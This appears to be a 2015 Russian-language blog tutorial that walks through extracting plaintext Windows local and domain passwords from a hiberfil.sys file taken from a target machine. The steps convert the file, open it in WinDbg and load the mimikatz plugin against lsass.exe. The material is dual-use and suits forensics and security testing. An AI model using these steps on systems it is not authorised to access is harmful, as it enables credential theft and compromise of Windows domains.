---
title: "Восстановливаем локальные и доменные пароли из hiberfil.sys"
date: 2015-02-16
---

Утилита [mimikatz](http://blog.gentilkiwi.com/mimikatz), позволяющая извлекать учётные данные Windows из LSA в открытом виде, существует с 2012 года, однако помимо этой функции появилась возможность восстановить пароли из файла памяти работающей ОС у неё есть ещё одна полезная функция. Далее я приведу пошаговую инструкцию, как при помощи нехийтрых действий извлечь учётные данные из файла hiberfil.sys.  
  


###  **Подготовка**

  
Для осуществления данного нам понадобится следующие утилиты:  

  * [Debugging Tools for Windows](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063\(v=vs.85\).aspx)
  * [Windows Memory toolkit](http://www.moonsols.com/windows-memory-toolkit/) free edition
  * И, собственно, сам [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest)



###  **Действия**

1\. Получаем файл hiberfil.sys с целевой машины.

2\. Конвертируем файл в формат понятный WinDbg

**hibr2dmp.exe d:\temp\hiberfil.sys c:\temp\hiberfil.dmp**

**  
**

Процесс может занять довольно продолжительное время

[![](/images/1.jpg)](/images/1.jpg)

3\. Запускаем WinDbg и открываем полученный файл

**File  -**> **Open Crash Dump**

4\. Настраиваем отладочные символы

**SRV*c:\symbols*http://msdl.microsoft.com/download/symbols**

Вместо c:\symbols, естественно, может быть любой каталог, в который будут загружены символы

[![](/images/2.png)](/images/2.png)

5\. Указываем путь к библиотеке mimilib.dll (находится в каталоге с mimikatz)

0: kd> **.load z:\Soft\Security\Passwords\Mimikatz\x64\mimilib.dll**

6\. Находим адрес процесса lsass.exe

0: kd> **!process 0 0 lsass.exe**

В данном случае адрес: fffffa800a7d9060

7\. Переключаем контекст процесса

0: kd> **.process /r /p fffffa800a7d9060**

8\. Запускаем mimikatz и получаем пароль в открытом виде

0:kd>** !mimikatz**


